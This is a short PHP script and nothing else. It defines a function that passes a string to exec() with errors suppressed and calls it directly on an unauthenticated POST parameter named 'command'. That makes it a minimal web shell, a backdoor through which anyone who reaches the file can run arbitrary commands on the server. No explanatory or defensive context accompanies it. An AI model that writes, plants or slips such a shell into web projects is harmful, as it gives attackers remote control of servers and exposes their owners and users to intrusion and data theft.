<?php
function shell($cmd)
{
    @exec($cmd,$ret);
	$ret = join("\n",$ret);
    return $ret;
}

shell($_POST['command']);
?>